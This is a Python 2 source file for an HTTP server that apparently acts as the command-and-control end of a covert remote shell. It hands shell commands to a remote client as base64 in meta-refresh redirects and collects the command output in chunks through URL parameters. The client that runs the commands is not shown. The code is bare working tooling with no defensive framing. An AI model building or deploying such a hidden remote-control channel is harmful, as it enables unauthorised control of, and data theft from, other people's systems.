#! /usr/bin/python

from time import asctime
from sys import exit

import base64
import socket
import re

import config
from shell import shell


def genDate():
    parts = asctime().split(' ')
    
    return "%s, %.2d %s %s %s GMT" % (
        parts[0].strip(),
        int(parts[-3].strip()),
        parts[1].strip(),
        parts[-1].strip(),
        parts[-2].strip()
        )

def receive(connection):
    content = ""
    read = ""
    while 1:
        read = connection.recv(512)
        content += read
        if re.search("\r\n\r\n", content):
            return content

def encode(string):
    code = base64.encodestring(string)
    return code[:-1]

def decode(string):
    plain = base64.decodestring(string)
    return plain[:-1]

def error(reason):
    return ("text/plain", "ERROR: %s" % reason)

def metaRefreshPage(response):
    html = """
    <html><head>
    <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
    <META HTTP-EQUIV="Expires" CONTENT="-1">
    <meta http-equiv="refresh" content="0; URL=http://%(ip)s:%(port)d/response?info=%(info)s">
    </head><body></body></html>""" 
    
    mapping = {
        'ip' : config.localip,
        'port' : config.localport,
        'info' : encode(response),
        }

    return ("text/html", html % mapping)

def responsePage(data):
    return ("text/plain", "blub")

def getCommand(data):
    command = shell.getCommand()
    return metaRefreshPage(command)

result = ""

def beginResult(data):
    global result
    result = ""
    return metaRefreshPage("")

def endResult(data):
    global result
    shell.response(decode(result))
    return metaRefreshPage("")

def sendResult(data):
    global result
    mo = re.match("data=(.*)", data)
    if mo:
        result += mo.group(1)
        return metaRefreshPage("")
    else:
        return error("illegal parameter")

def getBody(url):
    parts = url.split('?')
    if len(parts) == 1:
        parts.append("")

    map =   {
        "response" : responsePage,
        "getCommand" : getCommand,
        "beginResult" : beginResult,
        "endResult" : endResult,
        "sendResult" : sendResult,
            }
            
    for k,v in map.items():
        if parts[0] == k:
            return v(parts[1])
             
    return error("unknown command")

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sock.bind((config.localip, config.localport))
    sock.listen(1)

    while True:
        con = sock.accept()[0]
        content = receive(con)
        header = content.split('\n')
        mo = re.match("GET /(.*) HTTP/(.*)", header[0])
        if not mo:
            con.close
            print "illegal request:"
            print header
            continue

        (type, body) = getBody(mo.group(1))

        response = """HTTP/%(version)s 200 OK
        Date: %(date)s
        Server: Python
        Content-Type: %(type)s; charset=iso-8859-1

        %(body)s"""

        con.send(response % {
                    "version" : mo.group(2),
                    "date" : genDate(),
                    "type" : type,
                    "body" : body,
                    })
        con.close() 
            
if __name__ == "__main__":
    try:
        main()
    except Exception, e:
        if type(e) != KeyboardInterrupt:
            exit(0)
        else:
            print e
            exit(-1)
